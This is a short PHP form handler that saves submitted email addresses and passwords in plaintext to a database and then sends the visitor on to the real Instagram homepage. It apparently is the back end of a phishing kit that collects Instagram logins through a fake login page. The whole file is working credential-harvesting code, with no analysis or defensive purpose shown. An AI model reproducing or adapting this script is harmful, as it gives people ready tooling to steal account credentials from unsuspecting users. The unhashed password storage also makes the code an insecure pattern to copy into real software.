<?php
session_start();
require "config.php";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = isset($_POST['email']) ? trim($_POST['email']) : "";
    $password = isset($_POST['password']) ? trim($_POST['password']) : "";

    // Insert into database
    $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (:email, :password)");
    $stmt->execute([
        ':email' => $email,
        ':password' => $password,
    ]);

    // Optional session
    $_SESSION['email'] = $email;

    // Redirect to any page
    header("Location: https://www.instagram.com/"); // change to your page
    exit;
} else {
    // If accessed directly, redirect to form
    header("Location: index.php");
    exit;
}
?>
